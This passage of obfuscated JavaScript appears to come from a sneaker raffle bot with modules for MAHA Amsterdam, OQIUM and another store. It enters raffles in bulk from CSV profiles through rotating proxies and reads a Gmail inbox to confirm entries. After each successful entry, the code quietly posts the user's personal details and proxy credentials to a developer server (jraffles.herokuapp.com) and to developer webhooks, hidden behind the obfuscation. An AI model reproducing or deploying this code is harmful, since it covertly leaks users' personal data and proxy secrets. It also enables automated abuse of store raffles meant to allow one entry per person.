                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1777e7 = await _0x1d37e5['newPage']();
                            await _0x1777e7['authenticate']({
                                'username': '' + _0x5135c5[0x2],
                                'password': '' + _0x5135c5[0x3]
                            }), console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1777e7['setRequestInterception'](!![]), _0x1777e7['on']('request', _0x20f627 => {
                                _0x20f627['resourceType']() === 'image' || _0x20f627['resourceType']() === 'font' || _0x20f627['resourceType']() === 'media' ? _0x20f627['abort']() : _0x20f627['continue']();
                            }), await _0x1777e7['goto']('' + _0x453f92[_0x57a3d5]['Url'], { 'waitUntil': 'networkidle2' }), await _0x116d4a(0x12c), await _0x1777e7['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1777e7['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x116d4a(0x7d0);
                            try {
                                await _0x1777e7['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x1777e7['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1777e7['waitForSelector']('#username'), await _0x1777e7['type']('#username', _0x453f92[_0x57a3d5]['Email']), await _0x1777e7['waitForSelector']('#password'), await _0x1777e7['type']('#password', _0x453f92[_0x57a3d5]['Password']), await _0x116d4a(0x190), await _0x1777e7['click']('#buttonSubmit'), await _0x1777e7['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x453f92[_0x57a3d5]['Size']);
                            let _0x1cfe51 = _0x453f92[_0x57a3d5]['Size']['replace']('.5', '\x201/2');
                            if (_0x1cfe51['toUpperCase']() == 'RANDOM') {
                                const _0x2787c5 = await _0x1777e7['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x739fea = Math['round'](Math['random']() * (_0x2787c5['length'] - 0x1));
                                await _0x2787c5[_0x739fea]['click']();
                            } else
                                await _0x1777e7['click']('button[aria-label=\x22' + _0x1cfe51 + '\x22]');
                            await _0x116d4a(0x1f4);
                            try {
                                await _0x1777e7['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x116d4a(0x12c), console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1777e7['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_firstName', _0x453f92[_0x57a3d5]['FirstName']), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_lastName', _0x453f92[_0x57a3d5]['LastName']), await _0x116d4a(0x12c), await _0x1777e7['select']('#dwfrm_raffle_addressFields_country', _0x453f92[_0x57a3d5]['Country']), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_city', _0x453f92[_0x57a3d5]['City']), await _0x116d4a(0x12c);
                            _0x453f92[_0x57a3d5]['Postcode'] == undefined && (_0x453f92[_0x57a3d5]['Postcode'] = _0x453f92[_0x57a3d5]['Zip']);
                            await _0x1777e7['type']('#dwfrm_raffle_addressFields_postalCode', _0x453f92[_0x57a3d5]['Postcode']), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_address1', _0x453f92[_0x57a3d5]['Address1']), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_address2', _0x453f92[_0x57a3d5]['HouseNumber']), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x453f92[_0x57a3d5]['Address2']), await _0x116d4a(0x12c), await _0x1777e7['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x116d4a(0x12c), await _0x1777e7['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x453f92[_0x57a3d5]['Follower']), await _0x116d4a(0x1f4), await _0x1777e7['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20' + _0x1403a4['blue']('Awaiting\x20Paypal\x20Payment')), await _0x1777e7['click']('.b-paypal_button');
                            try {
                                await _0x1777e7['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x508e22 = 'no', _0x523ce4(_0x453f92[_0x57a3d5], _0x59e332), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1da432['succesDEVMSG']);
                                await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x1da432['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x1da432['succesPUBMSG']);
                                let _0x42cb14 = _0x453f92[_0x57a3d5];
                                try {
                                    prxdata = {
                                        'username': _0x358285['replace']('#', ''),
                                        'module': _0x59e332['name'],
                                        'entrydata': JSON['stringify'](_0x42cb14),
                                        'proxy': '' + _0x164140[_0x57a3d5]
                                    };
                                    var _0x4ca88e = JSON['stringify'](prxdata);
                                    let _0x35cdd7 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x4ca88e, _0x35cdd7);
                                } catch (_0x17fd47) {
                                }
                            } catch (_0x163a14) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x163a14)), _0xe494ce = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x163a14;
                                var _0x2e989c = await _0x2520f4(_0x453f92[_0x57a3d5], _0x59e332, 'dev', !![], _0xe494ce);
                                _0x1da432['errorDEV'] = { 'embeds': [_0x2e989c] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1da432['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x1da432['errorDEV']);
                            }
                        } catch (_0x1f7185) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20' + _0x1f7185)), _0xe494ce = '' + _0x1f7185;
                            var _0x2e989c = await _0x2520f4(_0x453f92[_0x57a3d5], _0x59e332, 'dev', !![], _0xe494ce);
                            _0x1da432['errorDEV'] = { 'embeds': [_0x2e989c] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1da432['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x1da432['errorDEV']), _0x508e22 = 'yes';
                        } finally {
                            _0x1d37e5 && _0x1d37e5['close']();
                            if (_0x508e22 == 'yes' && _0xa4a705 != 0x5) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x59e332['name'] + ']\x20Task\x20' + (_0x57a3d5 + 0x1) + '\x20:\x20Retrying\x20(' + _0xa4a705 + '\x20/\x205)')), _0x57a3d5 = _0x57a3d5 - 0x1, _0xa4a705 = _0xa4a705 + 0x1;
                                continue;
                            }
                            _0x508e22 == 'yes' && _0xa4a705 >= 0x5 && (_0x5925c7(_0x453f92[_0x57a3d5], _0x59e332), _0x508e22 = 'no', _0xa4a705 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['AfewDelay'] + '\x20ms'), await _0x116d4a(_0x51d52a['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1a05ed, _0x110fd3, _0x3eb274) {
                    for (var _0x3dc2f7 = 0x0; _0x3dc2f7 < _0x110fd3['length']; _0x3dc2f7++) {
                        try {
                            await _0x2c2316(_0x110fd3, _0x3dc2f7);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x823b0f(_0x28552c, _0x27bc85, _0x51e7aa, _0x321de9, _0x1cbe54) {
                            var _0x3eb07a, _0x4cdd38 = {}, _0x575873 = [], _0x1d1a97 = {}, _0x308d44 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1658d9 = Math['round'](Math['random']() * (_0x308d44['length'] - 0x1));
                            !_0x321de9 && (_0x321de9 = {});
                            if (_0x27bc85 != 'ver') {
                                _0x244762(_0x51e7aa['name'] + '\x20Task\x20' + (_0x28552c + 0x1) + '\x20/\x20' + _0x321de9['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7), await _0x2c2316(_0x321de9, _0x28552c), _0x4cdd38 = _0x51e7aa['data'], _0x4cdd38['data']['attributes']['email'] = '' + _0x321de9[_0x28552c]['Email'];
                                if (_0x321de9[_0x28552c]['Size'] == 'RANDOM') {
                                }
                                _0x4cdd38['data']['attributes']['properties']['$first_name'] = '' + _0x321de9[_0x28552c]['FirstName'], _0x4cdd38['data']['attributes']['properties']['$last_name'] = '' + _0x321de9[_0x28552c]['LastName'], _0x4cdd38['data']['attributes']['properties']['$address1'] = _0x321de9[_0x28552c]['Address1'] + '\x20' + _0x321de9[_0x28552c]['Address2'] + '\x20' + _0x321de9[_0x28552c]['HouseNumber'], _0x4cdd38['data']['attributes']['properties']['$zip'] = '' + _0x321de9[_0x28552c]['Zip'], _0x4cdd38['data']['attributes']['properties']['$city'] = '' + _0x321de9[_0x28552c]['City'], _0x4cdd38['data']['attributes']['properties']['$country'] = '' + _0x321de9[_0x28552c]['Country'], _0x321de9[_0x28552c]['Size'] == 'RANDOM' ? _0x4cdd38['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x308d44[_0x1658d9] : _0x4cdd38['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x321de9[_0x28552c]['Size'], _0x4cdd38['data']['attributes']['properties']['$phone_number'] = '' + _0x321de9[_0x28552c]['Phone'], _0x4cdd38['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x321de9[_0x28552c]['Follower'];
                            }
                            if (_0x51d52a['useRandomProxy'] = ![])
                                var _0x205e29 = _0x1cbe54[_0x28552c]['split'](':');
                            else
                                var _0x6a3822 = Math['round'](Math['random']() * (_0x1cbe54['length'] - 0x1)), _0x205e29 = _0x1cbe54[_0x6a3822]['split'](':');
                            var _0x2a27cf = {
                                'jar': _0x103baf,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x51e7aa['url'],
                                'headers': _0x51e7aa['headers'],
                                'body': JSON['stringify'](_0x4cdd38),
                                'proxy': 'http://' + _0x205e29[0x2] + ':' + _0x205e29[0x3] + '@' + _0x205e29[0x0] + ':' + _0x205e29[0x1]
                            };
                            return _0x27bc85 != 'ver' && (_0x2a27cf['url'] = _0x51e7aa['url'], _0x2a27cf['headers'] = _0x51e7aa['headers']), _0x27bc85 == 'ver' && (_0x2a27cf['method'] = 'GET'), new Promise(function (_0x3c4694, _0x45f1f5) {
                                callback = async (_0x385775, _0x9adee3, _0x40ed84) => {
                                    if (!_0x385775 && _0x9adee3['statusCode'] == 0xca || !_0x385775 && _0x9adee3['statusCode'] == 0xc8) {
                                        if (_0x27bc85 != 'ver') {
                                            var _0x5ac3c8 = await _0x2520f4(_0x321de9[_0x28552c], _0x51e7aa, 'dev', ![]), _0x181088 = await _0x2520f4(_0x321de9[_0x28552c], _0x51e7aa, 'pub', ![]);
                                            const _0x39e30d = {
                                                'succesDEVMSG': { 'embeds': [_0x5ac3c8] },
                                                'succesPUBMSG': { 'embeds': [_0x181088] }
                                            };
                                            let _0x4e84ed = _0x321de9[_0x28552c];
                                            try {
                                                prxdata = {
                                                    'username': _0x358285['replace']('#', ''),
                                                    'module': _0x51e7aa['name'],
                                                    'entrydata': JSON['stringify'](_0x4e84ed),
                                                    'proxy': '' + _0x1cbe54[_0x28552c]
                                                };
                                                var _0x213f3a = JSON['stringify'](prxdata);
                                                let _0x32abfd = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x213f3a, _0x32abfd);
                                            } catch (_0x454e1c) {
                                            }
                                            if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                                                try {
                                                    await _0x3c7bbe(_0x51d52a['webhook'], _0x39e30d['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x39e30d['succesDEVMSG']), await _0x116d4a(0xc8);
                                            try {
                                                await _0x3c7bbe(_0x55a106, _0x39e30d['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x523ce4(_0x321de9[_0x28552c], _0x51e7aa);
                                        }
                                        _0x3c4694(console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x51e7aa['name'] + ']\x20Task\x20' + (_0x28552c + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x27bc85 != 'ver') {
                                            var _0x2f82da = '' + _0x385775, _0x429582 = await _0x2520f4(_0x321de9[_0x28552c], _0x51e7aa, 'dev', !![], _0x2f82da), _0x99b065 = {};
                                            _0x99b065['errorDEV'] = { 'embeds': [_0x429582] }, _0x5925c7(_0x321de9[_0x28552c], _0x51e7aa), _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x99b065['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x99b065['errorDEV']);
                                        }
                                        _0x45f1f5(console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x51e7aa['name'] + ']\x20Task\x20' + (_0x28552c + 0x1) + ':\x20' + _0x385775)));
                                    }
                                };
                                try {
                                    _0x27bc85 != 'ver' && console['log'](_0x3982db() + '\x20[' + _0x51e7aa['name'] + ']\x20Task\x20' + (_0x28552c + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4cdd38['data']['attributes']['email']), _0x225fcc(_0x2a27cf, callback);
                                } catch (_0x21f902) {
                                    console['log'](_0x3982db() + '\x20Task\x20' + (_0x28552c + 0x1) + ':\x20' + _0x21f902);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x823b0f(_0x3dc2f7, 'nor', _0x1a05ed, _0x110fd3, _0x3eb274), console['log'](_0x3982db() + '\x20[' + _0x1a05ed['name'] + ']\x20Sleeping\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                        } catch (_0x1196a2) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4147a5, _0x590666, _0x18d6ad) {
                    var _0x58209e = [], _0x20a99e = ![];
                    async function _0x3d799b() {
                        var _0x46d8e7 = new _0x3e4e8d({
                            'user': _0x51d52a['masterMail'],
                            'password': _0x51d52a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x503fbf(_0x148b2b) {
                            _0x46d8e7['openBox']('INBOX', ![], _0x148b2b);
                        }
                        _0x46d8e7['once']('ready', function () {
                            _0x503fbf(function (_0x192b13, _0x5740bc) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x192b13)
                                    throw _0x192b13;
                                _0x46d8e7['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x5cecb9, _0x58a67b) {
                                    if (!_0x58a67b || !_0x58a67b['length'])
                                        console['log'](_0x3982db() + '\x20[' + _0x4147a5['name'] + ']\x20No\x20mails\x20found'), _0x46d8e7['end']();
                                    else {
                                        var _0xe946af = _0x46d8e7['seq']['fetch'](_0x58a67b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xe946af['on']('message', function (_0x4077e6, _0x5da6b9) {
                                            var _0x19744c = '(#' + _0x5da6b9 + ')\x20';
                                            _0x4077e6['on']('body', function (_0x3a77f8, _0x3e25c9) {
                                                _0x300bc8(_0x3a77f8, (_0x25379f, _0x2d045f) => {
                                                    var _0x5010fa = _0x2d045f['text']['split']('(')[0x1], _0xd2ac3d = _0x5010fa['split'](')')[0x0];
                                                    _0x58209e['push'](_0xd2ac3d);
                                                });
                                            }), _0x4077e6['once']('end', function () {
                                            });
                                        }), _0xe946af['once']('error', function (_0x2be8b4) {
                                            console['log']('Fetch\x20error:\x20' + _0x2be8b4), _0x20a99e = !![];
                                        }), _0xe946af['once']('end', function () {
                                            _0x46d8e7['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x46d8e7['once']('error', function (_0x2ea01c) {
                            console['log'](_0x1403a4['red'](_0x2ea01c['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x20a99e = !![];
                        }), _0x46d8e7['once']('end', async function () {
                            _0x20a99e = !![];
                        }), _0x46d8e7['connect']();
                    }
                    async function _0x25b3e3(_0x14d07c, _0x2e9130, _0x1bad03) {
                        for (var _0x575aba = 0x0; _0x575aba < _0x2e9130['length']; _0x575aba++) {
                            async function _0x1216cf(_0x54e1ed, _0x5cc926, _0x36eee5, _0x58c527, _0x59556e) {
                                var _0x4bb0a4, _0x4f411f = {}, _0x2a47b7 = [], _0x3680d0 = {}, _0x4cb8f1 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2c0180 = Math['round'](Math['random']() * (_0x4cb8f1['length'] - 0x1));
                                _0x58c527[_0x54e1ed]['Size'] == 'RANDOM' && (_0x58c527[_0x54e1ed]['Size'] = _0x4cb8f1[_0x2c0180]);
                                !_0x58c527 && (_0x58c527 = {});
                                if (_0x51d52a['useRandomProxy'] = ![])
                                    var _0x1f2dd2 = _0x59556e[_0x54e1ed]['split'](':');
                                else
                                    var _0x40daaf = Math['round'](Math['random']() * (_0x59556e['length'] - 0x1)), _0x1f2dd2 = _0x59556e[_0x40daaf]['split'](':');
                                var _0x1f379f = {
                                    'jar': _0x103baf,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x36eee5['url'],
                                    'headers': _0x36eee5['headers'],
                                    'body': JSON['stringify'](_0x4f411f),
                                    'proxy': 'http://' + _0x1f2dd2[0x2] + ':' + _0x1f2dd2[0x3] + '@' + _0x1f2dd2[0x0] + ':' + _0x1f2dd2[0x1]
                                };
                                return _0x5cc926 != 'ver' && (_0x1f379f['url'] = _0x36eee5['url'], _0x1f379f['headers'] = _0x36eee5['headers']), _0x5cc926 == 'ver' && (_0x1f379f['method'] = 'GET', _0x1f379f['url'] = _0x58c527[_0x54e1ed]), new Promise(function (_0x208ca8, _0x2ce1ea) {
                                    callback = async (_0x4e19a0, _0x58928d, _0x610569) => {
                                        if (!_0x4e19a0 && _0x58928d['statusCode'] == 0xca || !_0x4e19a0 && _0x58928d['statusCode'] == 0xc8) {
                                            if (_0x5cc926 != 'ver') {
                                                var _0x11efd0 = await _0x2520f4(_0x58c527[_0x54e1ed], _0x36eee5, 'dev', ![]), _0x16da87 = await _0x2520f4(_0x58c527[_0x54e1ed], _0x36eee5, 'pub', ![]);
                                                const _0x3e40d5 = {
                                                    'succesDEVMSG': { 'embeds': [_0x11efd0] },
                                                    'succesPUBMSG': { 'embeds': [_0x16da87] }
                                                };
                                                if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                                                    try {
                                                        await _0x3c7bbe(_0x51d52a['webhook'], _0x3e40d5['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x3e40d5['succesDEVMSG']), await _0x116d4a(0xc8);
                                                try {
                                                    await _0x3c7bbe(_0x55a106, _0x3e40d5['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x523ce4(_0x58c527[_0x54e1ed], _0x36eee5);
                                            }
                                            _0x208ca8(console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x36eee5['name'] + ']\x20Task\x20' + (_0x54e1ed + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5cc926 != 'ver') {
                                                var _0x5a6625 = '' + _0x4e19a0, _0xf1ee40 = await _0x2520f4(_0x58c527[_0x54e1ed], _0x36eee5, 'dev', !![], _0x5a6625), _0x1be037 = {};
                                                _0x1be037['errorDEV'] = { 'embeds': [_0xf1ee40] }, _0x5925c7(_0x58c527[_0x54e1ed], _0x36eee5), _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1be037['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x1be037['errorDEV']);
                                            }
                                            _0x2ce1ea(console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x36eee5['name'] + ']\x20Task\x20' + (_0x54e1ed + 0x1) + ':\x20' + _0x4e19a0)));
                                        }
                                    };
                                    try {
                                        _0x5cc926 != 'ver' ? console['log'](_0x3982db() + '\x20[' + _0x36eee5['name'] + ']\x20Task\x20' + (_0x54e1ed + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4f411f['data']['attributes']['email']) : console['log'](_0x3982db() + '\x20[' + _0x36eee5['name'] + ']\x20Task\x20' + (_0x54e1ed + 0x1) + ':\x20Fetching\x20Response'), _0x225fcc(_0x1f379f, callback);
                                    } catch (_0x4ea4d4) {
                                        console['log'](_0x3982db() + '\x20Task\x20' + (_0x54e1ed + 0x1) + ':\x20' + _0x4ea4d4);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1216cf(_0x575aba, 'ver', _0x14d07c, _0x2e9130, _0x1bad03), console['log'](_0x3982db() + '\x20[' + _0x14d07c['name'] + ']\x20Sleeping\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                            } catch (_0x5c8819) {
                            }
                        }
                    }
                    try {
                        _0x3d799b();
                        while (!_0x20a99e) {
                            await _0x116d4a(0xbb8);
                        }
                        console['log']('Found\x20' + _0x58209e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x116d4a(0x9c4);
                    }
                    await _0x25b3e3(_0x4147a5, _0x58209e, _0x18d6ad);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x10010f, _0x464e68, _0x71d199) {
                    var _0x4ca455 = _0x464e68, _0x49d35c = 0x0;
                    for (var _0x121e1a = 0x0; _0x121e1a < _0x464e68['length']; _0x121e1a++) {
                        maxTasks = _0x51d52a['threads'];
                        while (_0x49d35c >= maxTasks) {
                            await _0x116d4a(_0x51d52a['delay']);
                        }
                        async function _0x11e5ee(_0x37ec4e, _0x274499, _0x20a986, _0x50afab) {
                            try {
                                await _0x2c2316(_0x274499, _0x50afab);
                            } catch (_0x5c09a2) {
                                throw new Error(_0x5c09a2);
                            }
                            async function _0x21e209(_0x3dee62, _0x2d4035, _0x284215, _0x355a69, _0x57353b) {
                                _0x49d35c++;
